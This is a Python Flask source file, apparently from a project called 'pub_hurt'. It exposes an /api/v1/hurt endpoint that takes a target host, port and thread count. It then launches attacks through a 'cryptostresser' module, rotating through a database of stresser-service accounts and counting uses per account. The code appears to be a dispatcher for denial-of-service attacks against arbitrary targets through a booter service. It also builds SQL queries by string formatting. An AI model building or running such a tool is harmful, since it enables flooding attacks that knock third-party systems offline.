# -*- coding:utf-8 -*-
# @time     : 2022-07-12 10:42:20
# @File     : Hurt_Main.py
# @Author   : Twoyear
# 定义主函数，调用其他函数,Hurt调度

import json
import os
import sys

sys.path.append("/root/pub_hurt")
sys.path.append(os.path.join(os.path.abspath(__file__)))
from flask import Flask, request
from flask_script import Manager
from tool import Mysql_main
from Hurt_list.cryptostresser import hurt_main as crypto_hurt
import threading

app = Flask(__name__)
manager = Manager(app)


def get_caypto(threads):
    threads_sql = "select * from cryptostresser_user where run_count < 30 limit %s" % str(threads)
    threads_list = Mysql_main(method="fetchall_dict", sql=threads_sql)
    return threads_list


@app.route("/api/v1/hurt", methods=['GET', 'POST', 'PUT'])
def hurt():
    if request.method == 'GET':
        return json.dumps({'code': '400', 'msg': '请求方式错误'})
    elif request.method == 'POST':
        # 先获取参数
        host = request.form.get('host', "")
        port = request.form.get('port', "")
        threads = int(request.form.get('threads', 1))
        type = request.form.get('type', "")
        hurt_type = request.form.get('hurt_type', "ip")
        if str(host) == "" or str(port) == "":
            return json.dumps({'code': '404', 'msg': '参数错误'})
        if str(type) == "max":
            '''
            如果是max，则调用全部的Hurt函数,使用多线程技术，每次调用一个线程，暂时跳过开发中
            '''
            crypto_hurt(hurt_type, host, port, threads)
            return {'code': '200', 'msg': '成功'}
        elif str(type) == "min" or str(type) == "":
            '''
            如果是min，则调用最小的Hurt函数
            '''
            run_user_info_list = get_caypto(threads)
            hurt_user_len = len(run_user_info_list)
            hurt_true_len = 0
            error_text = ""
            for user_info in run_user_info_list:
                result = crypto_hurt(hurt_type, host, port, user_info)  # 返回成功或者失败后更新数据库字段
                # print(result)
                if result["code"] == "200" or result["code"] == 200:
                    sql = "update cryptostresser_user set run_count = run_count + 1 where id = %s" % str(
                        user_info["id"])
                    Mysql_main(method="update", sql=sql)
                    hurt_true_len += 1
                else:
                    msg = result["msg"]
                    error_text += msg + "  ---**|||**---  "

            msg = "共使用%s个用户，成功%s个用户" % (str(hurt_user_len), str(hurt_true_len))
            return json.dumps({'code': '200', 'msg': msg, 'error_text': error_text})
    else:
        return json.dumps({'code': '400', 'msg': '请求方式错误'})


if __name__ == '__main__':
    # get_caypto(threads=1)
    manager.run()
